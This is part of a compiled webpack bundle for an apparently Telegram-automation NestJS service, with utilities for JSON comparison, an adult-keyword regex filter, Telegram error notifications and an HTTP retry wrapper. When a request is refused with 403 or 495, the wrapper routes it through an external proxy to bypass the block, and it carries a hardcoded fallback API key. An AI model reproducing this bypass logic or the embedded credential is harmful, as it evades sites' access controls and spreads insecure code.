            console.log(`[KEYS] obj1: [${keys1.join(', ')}]`);
            console.log(`[KEYS] obj2: [${keys2.join(', ')}]`);
            return true;
        }
        for (const key of keys1) {
            if (!keys2.includes(key)) {
                console.log(`[MISMATCH] ${path}: key "${key}" missing in obj2`);
                return true;
            }
        }
        for (const key of keys1) {
            const keyPath = path ? `${path}.${key}` : key;
            if (compare(record1[key], record2[key], keyPath, depth + 1)) {
                return true;
            }
        }
        return false;
    }
    const result = compare(json1, json2);
    console.log(`[COMPARISON END] Result: ${result ? 'DIFFERENT' : 'SAME'}`);
    return result;
}
function mapToJson(map) {
    if (!(map instanceof Map)) {
        throw new Error('Input must be a Map instance');
    }
    const obj = {};
    for (const [key, value] of map.entries()) {
        obj[String(key)] = value;
    }
    return obj;
}
function shouldMatch(obj) {
    const regex = /(wife|adult|lanj|chat|𝑭𝒂𝒎𝒊𝒍𝒚|𝙏𝙖𝙢𝙞𝙡|𝐒𝐖𝐀𝐏|lesb|aunty|girl|boy|tamil|kannad|telugu|hindi|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi)/i;
    const titleMatch = obj.title && regex.test(obj.title);
    const usernameMatch = obj.username && regex.test(obj.username);
    return !!(titleMatch || usernameMatch);
}


/***/ }),

/***/ "./src/utils/fetchWithTimeout.ts":
/*!***************************************!*\
  !*** ./src/utils/fetchWithTimeout.ts ***!
  \***************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.fetchWithTimeout = fetchWithTimeout;
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
const common_1 = __webpack_require__(/*! ./common */ "./src/utils/common.ts");
const TelegramBots_config_1 = __webpack_require__(/*! ./TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
const DEFAULT_RETRY_CONFIG = {
    maxRetries: 3,
    baseDelay: 500,
    maxDelay: 30000,
    jitterFactor: 0.2,
};
const DEFAULT_NOTIFICATION_CONFIG = {
    enabled: true,
    channelEnvVar: 'httpFailuresChannel',
    timeout: 5000,
};
async function notifyInternal(prefix, errorDetails, config = DEFAULT_NOTIFICATION_CONFIG) {
    if (!config.enabled)
        return;
    prefix = `${prefix} ${process.env.clientId}`;
    try {
        const errorMessage = typeof errorDetails.message === 'string'
            ? errorDetails.message
            : JSON.stringify(errorDetails.message);
        const formattedMessage = errorMessage.includes('ETIMEDOUT')
            ? 'Connection timed out'
            : errorMessage.includes('ECONNREFUSED')
                ? 'Connection refused'
                : (0, parseError_1.extractMessage)(errorDetails?.message);
        console.error(`${prefix}\n${formattedMessage}`);
        if (errorDetails.status === 429)
            return;
        const notificationText = `${prefix}\n\n${formattedMessage}`;
        try {
            await TelegramBots_config_1.BotConfig.getInstance().sendMessage(TelegramBots_config_1.ChannelCategory.HTTP_FAILURES, notificationText);
        }
        catch (error) {
            console.error('Failed to send notification:', error.response?.data || error.message || error.code);
        }
    }
    catch (error) {
        console.error('Error in notification process:', error.response?.data || error.message || error.code);
    }
}
const RETRYABLE_NETWORK_ERRORS = [
    'ETIMEDOUT',
    'ECONNABORTED',
    'ECONNREFUSED',
    'ECONNRESET',
    'ERR_NETWORK',
    'ERR_BAD_RESPONSE',
    'EHOSTUNREACH',
    'ENETUNREACH',
];
const RETRYABLE_STATUS_CODES = [408, 500, 502, 503, 504];
function shouldRetry(error, parsedError) {
    if (axios_1.default.isAxiosError(error)) {
        if (error.code && RETRYABLE_NETWORK_ERRORS.includes(error.code)) {
            return true;
        }
        if (error.message?.toLowerCase().includes('timeout')) {
            return true;
        }
    }
    return RETRYABLE_STATUS_CODES.includes(parsedError.status);
}
function calculateBackoff(attempt, config = DEFAULT_RETRY_CONFIG) {
    const base = Math.min(config.baseDelay * Math.pow(2, attempt), config.maxDelay);
    const jitter = Math.random() * (base * config.jitterFactor);
    return Math.floor(base + jitter);
}
async function makeBypassRequest(url, options) {
    const bypassUrl = options.bypassUrl || process.env.bypassURL || '';
    if (!bypassUrl) {
        throw new Error('Bypass URL is not provided');
    }
    const finalBypassUrl = bypassUrl.startsWith('http')
        ? bypassUrl
        : 'https://helper-thge.onrender.com/execute-request';
    const bypassAxios = axios_1.default.create({
        responseType: options.responseType || 'json',
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        timeout: options.timeout || 30000,
    });
    const response = await bypassAxios.post(finalBypassUrl, {
        url,
        method: options.method,
        headers: options.headers,
        data: options.data,
        params: options.params,
        responseType: options.responseType,
        timeout: options.timeout,
        followRedirects: options.maxRedirects !== 0,
        maxRedirects: options.maxRedirects,
    }, {
        headers: {
            'Content-Type': 'application/json',
            'x-api-key': process.env.X_API_KEY || 'santoor',
            ...options.headers,
        },
    });
    if (response &&
        (options.responseType === 'arraybuffer' ||
            response.headers['content-type']?.includes('application/octet-stream') ||
            response.headers['content-type']?.includes('image/') ||
            response.headers['content-type']?.includes('audio/') ||
            response.headers['content-type']?.includes('video/') ||
            response.headers['content-type']?.includes('application/pdf'))) {
        response.data = Buffer.from(response.data);
    }
    return response;
}
function parseUrl(url) {
    if (!url || typeof url !== 'string') {
        return null;
    }
    try {
        const parsedUrl = new URL(url);
        return {
            host: parsedUrl.host,
            endpoint: parsedUrl.pathname + parsedUrl.search,
        };
    }
    catch (error) {
        return null;
    }
}
async function fetchWithTimeout(url, options = {}, maxRetries) {
    console.log(`Fetching URL: ${url} with options:`, options);
    if (!url) {
        console.error('URL is empty');
        return undefined;
    }
    const retryConfig = {
        ...DEFAULT_RETRY_CONFIG,
        ...options.retryConfig,
        maxRetries: maxRetries !== undefined
            ? maxRetries
            : options.retryConfig?.maxRetries || DEFAULT_RETRY_CONFIG.maxRetries,
    };
    const notificationConfig = {
        ...DEFAULT_NOTIFICATION_CONFIG,
        ...options.notificationConfig,
    };
    options.timeout = options.timeout || 30000;
    options.method = options.method || 'GET';
    const urlInfo = parseUrl(url);
    if (!urlInfo) {
        console.error(`Invalid URL: ${url}`);
        return undefined;
    }
    const { host, endpoint } = urlInfo;
    const clientId = process.env.clientId || 'UnknownClient';
    let lastError = null;
    for (let attempt = 0; attempt <= retryConfig.maxRetries; attempt++) {
        const controller = new AbortController();
        const currentTimeout = options.timeout + attempt * 5000;
        const timeoutId = setTimeout(() => {
            try {
                controller.abort();
            }
            catch (abortError) {
                console.error('Error during abort:', abortError);
            }
        }, currentTimeout);
        try {
            const response = await (0, axios_1.default)({
                ...options,
                url,
                signal: controller.signal,
                maxRedirects: options.maxRedirects ?? 5,
                timeout: currentTimeout,
                headers: {
                    'Content-Type': 'application/json',
                    'x-api-key': process.env.X_API_KEY || 'santoor',
                    ...options.headers,
                },
            });
            clearTimeout(timeoutId);
            return response;
        }
        catch (error) {
            clearTimeout(timeoutId);
            lastError = error instanceof Error ? error : new Error(String(error));
            let parsedError;
            try {
                parsedError = (0, parseError_1.parseError)(error, `host: ${host}\nendpoint:${endpoint}`, false);
            }
            catch (parseErrorError) {
                console.error('Error in parseError:', parseErrorError);
                parsedError = {
                    status: 500,
                    message: String(error),
                    error: 'ParseError',
                };
            }
            const message = parsedError.message;
            const isTimeout = axios_1.default.isAxiosError(error) &&
                (error.code === 'ECONNABORTED' ||
                    (message && message.includes('timeout')) ||
                    parsedError.status === 408);
            if (parsedError.status === 403 || parsedError.status === 495) {
                try {
                    const bypassResponse = await makeBypassRequest(url, options);
                    if (bypassResponse) {
                        await notifyInternal(`Successfully Bypassed the request`, { message: `${clientId} host=${host}\nendpoint=${endpoint}` }, notificationConfig);
                        return bypassResponse;
                    }
                }
                catch (bypassError) {
                    let errorDetails;
                    try {
                        const bypassParsedError = (0, parseError_1.parseError)(bypassError, `host: ${host}\nendpoint:${endpoint}`, false);
                        errorDetails = (0, parseError_1.extractMessage)(bypassParsedError);
                    }
                    catch (extractBypassError) {
                        console.error('Error extracting bypass error message:', extractBypassError);
                        errorDetails = String(bypassError);
                    }
                    await notifyInternal(`Bypass attempt failed`, {
                        message: `host=${host}\nendpoint=${endpoint}\n${`msg: ${errorDetails.slice(0, 150)}\nURL: ${url}`}`,
                    }, notificationConfig);
                }
            }
            else {
                if (isTimeout) {
                    await notifyInternal(`Request timeout on attempt ${attempt}`, {
                        message: `${clientId} host=${host}\nendpoint=${endpoint}\ntimeout=${options.timeout}ms`,
                        status: 408,
                    }, notificationConfig);
                }
                else {
                    await notifyInternal(`Attempt ${attempt} failed`, {
                        message: `${clientId} host=${host}\nendpoint=${endpoint}\n${`mgs: ${message.slice(0, 150)}`}`,
                        status: parsedError.status,
                    }, notificationConfig);
                }
            }
            if (attempt < retryConfig.maxRetries && shouldRetry(error, parsedError)) {
                const delay = calculateBackoff(attempt, retryConfig);
                console.log(`Retrying request (${attempt + 1}/${retryConfig.maxRetries}) after ${delay}ms`);
                await (0, common_1.sleep)(delay);
                continue;
            }
            if (attempt >= retryConfig.maxRetries) {
                break;
            }
        }
    }
    try {
        let errorData;
        try {
            if (lastError) {
                const parsedLastError = (0, parseError_1.parseError)(lastError, `${clientId} host: ${host}\nendpoint:${endpoint}`, false);
                errorData = (0, parseError_1.extractMessage)(parsedLastError);
            }
            else {
                errorData = 'Unknown error';
            }
        }
        catch (extractLastError) {
            console.error('Error extracting last error:', extractLastError);
            errorData = String(lastError) || 'Unknown error';
        }
        await notifyInternal(`All ${retryConfig.maxRetries} retries exhausted`, { message: `${errorData.slice(0, 150)}` }, notificationConfig);
    }
    catch (finalError) {
        console.error('Failed to send final error notification:', finalError);
    }
    return undefined;
}


/***/ }),

/***/ "./src/utils/index.ts":
/*!****************************!*\
  !*** ./src/utils/index.ts ***!
  \****************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.parseError = exports.ppplbot = exports.fetchWithTimeout = exports.toBoolean = exports.shouldMatch = exports.mapToJson = exports.areJsonsNotSame = exports.fetchNumbersFromString = exports.defaultReactions = exports.defaultMessages = exports.sleep = exports.contains = void 0;
var common_1 = __webpack_require__(/*! ./common */ "./src/utils/common.ts");
Object.defineProperty(exports, "contains", ({ enumerable: true, get: function () { return common_1.contains; } }));
Object.defineProperty(exports, "sleep", ({ enumerable: true, get: function () { return common_1.sleep; } }));
Object.defineProperty(exports, "defaultMessages", ({ enumerable: true, get: function () { return common_1.defaultMessages; } }));
Object.defineProperty(exports, "defaultReactions", ({ enumerable: true, get: function () { return common_1.defaultReactions; } }));
Object.defineProperty(exports, "fetchNumbersFromString", ({ enumerable: true, get: function () { return common_1.fetchNumbersFromString; } }));
Object.defineProperty(exports, "areJsonsNotSame", ({ enumerable: true, get: function () { return common_1.areJsonsNotSame; } }));
Object.defineProperty(exports, "mapToJson", ({ enumerable: true, get: function () { return common_1.mapToJson; } }));
Object.defineProperty(exports, "shouldMatch", ({ enumerable: true, get: function () { return common_1.shouldMatch; } }));
Object.defineProperty(exports, "toBoolean", ({ enumerable: true, get: function () { return common_1.toBoolean; } }));
var fetchWithTimeout_1 = __webpack_require__(/*! ./fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
Object.defineProperty(exports, "fetchWithTimeout", ({ enumerable: true, get: function () { return fetchWithTimeout_1.fetchWithTimeout; } }));
var logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
Object.defineProperty(exports, "ppplbot", ({ enumerable: true, get: function () { return logbots_1.ppplbot; } }));
var parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
Object.defineProperty(exports, "parseError", ({ enumerable: true, get: function () { return parseError_1.parseError; } }));


/***/ }),

/***/ "./src/utils/logbots.ts":
/*!******************************!*\
  !*** ./src/utils/logbots.ts ***!
  \******************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getBotToken = getBotToken;
exports.notifbot = notifbot;
exports.ppplbot = ppplbot;
const getBotTokens = () => {
    const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);
    if (botTokens.length === 0) {
        throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');
    }
    return botTokens;
};
let botTokens = null;
let currentTokenIndex = 0;
const initializeBotTokens = () => {
    if (botTokens === null) {
        botTokens = getBotTokens();
    }
    return botTokens;
};
function getBotToken() {
    return initializeBotTokens()[currentTokenIndex];
}
function notifbot(chatId = process.env.accountsChannel || "-1001801844217", botToken) {
    const tokens = initializeBotTokens();
    const token = botToken || tokens[currentTokenIndex];
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
    if (!botToken) {
        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
    }
    return apiUrl;
}
function ppplbot(chatId = process.env.updatesChannel || '-1001972065816', botToken) {
    const tokens = initializeBotTokens();
    const token = botToken || tokens[currentTokenIndex];
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
    if (!botToken) {
        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
    }
    return apiUrl;
}


/***/ }),

/***/ "./src/utils/parseError.ts":
/*!*********************************!*\
  !*** ./src/utils/parseError.ts ***!
  \*********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ErrorUtils = void 0;
exports.extractMessage = extractMessage;
exports.parseError = parseError;
exports.isAxiosError = isAxiosError;
exports.createError = createError;
const logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const DEFAULT_ERROR_CONFIG = {
    maxMessageLength: 200,
    notificationTimeout: 10000,
    ignorePatterns: [
        /INPUT_USER_DEACTIVATED/i,
        /too many req/i,
        /could not find/i,
        /ECONNREFUSED/i
    ],
    defaultStatus: 500,
    defaultMessage: 'An unknown error occurred',
    defaultError: 'UnknownError'
};
function safeStringify(data, depth = 0, maxDepth = 3) {
    if (depth > maxDepth) {
        return '[Max Depth Reached]';
    }
    try {
        if (data === null || data === undefined) {
            return String(data);
        }
        if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {
            return String(data);
        }
        if (data instanceof Error) {
            return data.message || data.toString();
        }
        if (Array.isArray(data)) {
            if (data.length === 0)
                return '[]';
            return `[${data.map(item => safeStringify(item, depth + 1, maxDepth)).join(', ')}]`;
        }
        if (typeof data === 'object') {
            const entries = Object.entries(data)
                .filter(([_, v]) => v !== undefined && v !== null)
                .map(([k, v]) => `${k}: ${safeStringify(v, depth + 1, maxDepth)}`);
            if (entries.length === 0)
                return '{}';
            return `{${entries.join(', ')}}`;
        }
        return String(data);
    }
    catch (error) {
        return `[Error Stringifying: ${error instanceof Error ? error.message : String(error)}]`;
    }
}
function extractMessage(data, path = '', depth = 0, maxDepth = 5) {
    try {
        if (depth > maxDepth) {
            return `${path}=[Max Depth Reached]`;
        }
        if (data === null || data === undefined) {
            return '';
        }
        if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {
            return path ? `${path}=${data}` : String(data);
        }
        if (data instanceof Error) {
            const errorInfo = [
                data.message ? `message=${data.message}` : '',
                data.name ? `name=${data.name}` : '',
                data.stack ? `stack=${data.stack.split('\n')[0]}` : ''
            ].filter(Boolean).join('\n');
            return path ? `${path}=(${errorInfo})` : errorInfo;
        }
        if (Array.isArray(data)) {
            if (data.length === 0) {
                return '';
            }
            return data
                .map((item, index) => extractMessage(item, path ? `${path}[${index}]` : `[${index}]`, depth + 1, maxDepth))
                .filter(Boolean)
                .join('\n');
        }
        if (typeof data === 'object') {
            const messages = [];
            for (const key of Object.keys(data)) {
                const value = data[key];
                const newPath = path ? `${path}.${key}` : key;
                const extracted = extractMessage(value, newPath, depth + 1, maxDepth);
                if (extracted) {
                    messages.push(extracted);
                }
            }
            return messages.join('\n');
        }
        return '';
    }
    catch (error) {
        console.error("Error in extractMessage:", error);
        return `Error extracting message: ${error instanceof Error ? error.message : String(error)}`;
    }
}
async function sendNotification(url, timeout = DEFAULT_ERROR_CONFIG.notificationTimeout) {
    try {
        if (!url || typeof url !== 'string' || !url.startsWith('http')) {
            console.error("Invalid notification URL:", url);
            return undefined;
        }
        return await axios_1.default.get(url, {
            timeout,
            validateStatus: status => status < 500
        });
    }
    catch (error) {
        console.error("Failed to send notification:", error instanceof Error ? error.message : String(error));
        return undefined;
    }
}
function shouldIgnoreError(message, status, patterns) {
    if (status === 429)
        return true;
    return patterns.some(pattern => pattern.test(message));
}
function extractStatusCode(err, defaultStatus) {
    if (!err)
        return defaultStatus;
    if (err.response) {
        const response = err.response;
        return response.data?.statusCode ||
            response.data?.status ||
            response.data?.ResponseCode ||
            response.status ||
            err.status ||
            defaultStatus;
    }
    return err.statusCode || err.status || defaultStatus;
}
function extractErrorMessage(err, defaultMessage) {
    if (!err)
        return defaultMessage;
    if (err.response?.data) {
        const responseData = err.response.data;
        return responseData.message ||
            responseData.errors ||
            responseData.ErrorMessage ||
            responseData.errorMessage ||
            responseData.UserMessage ||
            (typeof responseData === 'string' ? responseData : null) ||
            err.response.statusText ||
            err.message ||
            defaultMessage;
    }
    if (err.request) {
        return err.data?.message ||
            err.data?.errors ||
            err.data?.ErrorMessage ||
            err.data?.errorMessage ||
            err.data?.UserMessage ||
            (typeof err.data === 'string' ? err.data : null) ||
            err.message ||
            err.statusText ||
            'The request was triggered but no response was received';
    }
    return err.message || err.errorMessage || defaultMessage;
}
function extractErrorType(err, defaultError) {
    if (!err)
        return defaultError;
    if (err.response?.data?.error) {
        return err.response.data.error;
    }
    return err.error || err.name || err.code || defaultError;
}
function parseError(err, prefix, sendErr = true, config = {}) {
    const fullConfig = { ...DEFAULT_ERROR_CONFIG, ...config };
    try {
        const clientId = process.env.clientId || process.env.serviceName;
        const prefixStr = `${clientId}${prefix ? ` - ${prefix}` : ''}`;
        const status = extractStatusCode(err, fullConfig.defaultStatus);
        const rawMessage = extractErrorMessage(err, fullConfig.defaultMessage);
        const error = extractErrorType(err, fullConfig.defaultError);
        let extractedMessage;
        try {
            extractedMessage = typeof rawMessage === 'string' ? rawMessage : extractMessage(rawMessage);
        }
        catch (e) {
            extractedMessage = safeStringify(rawMessage) || 'Error extracting message';
        }
        const fullMessage = `${prefixStr} :: ${extractedMessage}`;
        console.log("parsedErr: ", fullMessage);
        const response = {
            status,
            message: err.errorMessage ? err.errorMessage : String(fullMessage).slice(0, fullConfig.maxMessageLength),
            error,
            raw: err
        };
        if (sendErr) {
            try {
                const ignoreError = shouldIgnoreError(fullMessage, status, fullConfig.ignorePatterns);
                if (!ignoreError) {
                    const notificationMessage = err.errorMessage ? err.errorMessage : extractedMessage;
                    const notifUrl = `${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(prefixStr)} :: ${encodeURIComponent(notificationMessage)}`;
                    sendNotification(notifUrl, fullConfig.notificationTimeout)
                        .catch(e => console.error("Failed to send error notification:", e));
                }
            }
            catch (notificationError) {
                console.error('Failed to prepare error notification:', notificationError);
            }
        }
        return response;
    }
    catch (fatalError) {
        console.error("Fatal error in parseError:", fatalError);
        return {
            status: fullConfig.defaultStatus,
            message: "Error in error handling",
            error: "FatalError",
            raw: err
        };
    }
}
function isAxiosError(error) {
    return axios_1.default.isAxiosError(error);
}
function createError(message, status = 500, errorType = 'ApplicationError') {
    return {
        status,
        message,
        error: errorType
    };
}
exports.ErrorUtils = {
    parseError,
    extractMessage,
    sendNotification,
    createError,
    isAxiosError
};


/***/ }),

/***/ "@nestjs/common":
/*!*********************************!*\
  !*** external "@nestjs/common" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@nestjs/common");

/***/ }),

/***/ "@nestjs/config":
/*!*********************************!*\
  !*** external "@nestjs/config" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@nestjs/config");

/***/ }),

/***/ "@nestjs/core":
/*!*******************************!*\
  !*** external "@nestjs/core" ***!
  \*******************************/
/***/ ((module) => {

module.exports = require("@nestjs/core");

/***/ }),

/***/ "@nestjs/mapped-types":
/*!***************************************!*\
  !*** external "@nestjs/mapped-types" ***!
  \***************************************/
/***/ ((module) => {

module.exports = require("@nestjs/mapped-types");

/***/ }),

/***/ "@nestjs/mongoose":
/*!***********************************!*\
  !*** external "@nestjs/mongoose" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("@nestjs/mongoose");

/***/ }),

/***/ "@nestjs/platform-express":
/*!*******************************************!*\
  !*** external "@nestjs/platform-express" ***!
  \*******************************************/
/***/ ((module) => {

module.exports = require("@nestjs/platform-express");

/***/ }),

/***/ "@nestjs/swagger":
/*!**********************************!*\
  !*** external "@nestjs/swagger" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("@nestjs/swagger");

/***/ }),

/***/ "adm-zip":
/*!**************************!*\
  !*** external "adm-zip" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("adm-zip");

/***/ }),

/***/ "axios":
/*!************************!*\
  !*** external "axios" ***!
  \************************/
/***/ ((module) => {

module.exports = require("axios");

/***/ }),

/***/ "big-integer":
/*!******************************!*\
  !*** external "big-integer" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("big-integer");

/***/ }),

/***/ "class-transformer":
/*!************************************!*\
  !*** external "class-transformer" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("class-transformer");

/***/ }),

/***/ "class-validator":
/*!**********************************!*\
  !*** external "class-validator" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("class-validator");

/***/ }),

/***/ "cloudinary":
/*!*****************************!*\
  !*** external "cloudinary" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("cloudinary");

/***/ }),

/***/ "crypto":
/*!*************************!*\
  !*** external "crypto" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("crypto");

/***/ }),

/***/ "form-data":
/*!****************************!*\
  !*** external "form-data" ***!
  \****************************/
/***/ ((module) => {

module.exports = require("form-data");

/***/ }),

/***/ "fs":
/*!*********************!*\
  !*** external "fs" ***!
  \*********************/
/***/ ((module) => {

module.exports = require("fs");

/***/ }),

/***/ "https":
/*!************************!*\
  !*** external "https" ***!
  \************************/
/***/ ((module) => {

module.exports = require("https");

/***/ }),

/***/ "imap":
/*!***********************!*\
  !*** external "imap" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("imap");

/***/ }),

/***/ "lodash":
/*!*************************!*\
  !*** external "lodash" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("lodash");

/***/ }),

/***/ "mongoose":
/*!***************************!*\
  !*** external "mongoose" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("mongoose");

/***/ }),

/***/ "multer":
/*!*************************!*\
  !*** external "multer" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("multer");

/***/ }),

/***/ "path":
/*!***********************!*\
  !*** external "path" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("path");

/***/ }),

/***/ "reflect-metadata":
/*!***********************************!*\
  !*** external "reflect-metadata" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("reflect-metadata");

/***/ }),

/***/ "telegram":
/*!***************************!*\
  !*** external "telegram" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("telegram");

/***/ }),

/***/ "telegram/Helpers":
/*!***********************************!*\
  !*** external "telegram/Helpers" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("telegram/Helpers");

/***/ }),

/***/ "telegram/Password":
/*!************************************!*\
  !*** external "telegram/Password" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/Password");

/***/ }),

/***/ "telegram/client/uploads":
/*!******************************************!*\
  !*** external "telegram/client/uploads" ***!
  \******************************************/
/***/ ((module) => {

module.exports = require("telegram/client/uploads");

/***/ }),

/***/ "telegram/events":
/*!**********************************!*\
  !*** external "telegram/events" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("telegram/events");

/***/ }),

/***/ "telegram/extensions/Logger":
/*!*********************************************!*\
  !*** external "telegram/extensions/Logger" ***!
  \*********************************************/
/***/ ((module) => {

module.exports = require("telegram/extensions/Logger");

/***/ }),

/***/ "telegram/sessions":
/*!************************************!*\
  !*** external "telegram/sessions" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/sessions");

/***/ }),

/***/ "telegram/tl":
/*!******************************!*\
  !*** external "telegram/tl" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("telegram/tl");

/***/ }),

/***/ "url":
/*!**********************!*\
  !*** external "url" ***!
  \**********************/
/***/ ((module) => {

module.exports = require("url");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module is referenced by other modules so it can't be inlined
/******/ 	var __webpack_exports__ = __webpack_require__("./src/main.ts");
/******/ 	var __webpack_export_target__ = exports;
/******/ 	for(var __webpack_i__ in __webpack_exports__) __webpack_export_target__[__webpack_i__] = __webpack_exports__[__webpack_i__];
/******/ 	if(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", { value: true });
/******/ 	
/******/ })()
;
//# sourceMappingURL=index.js.map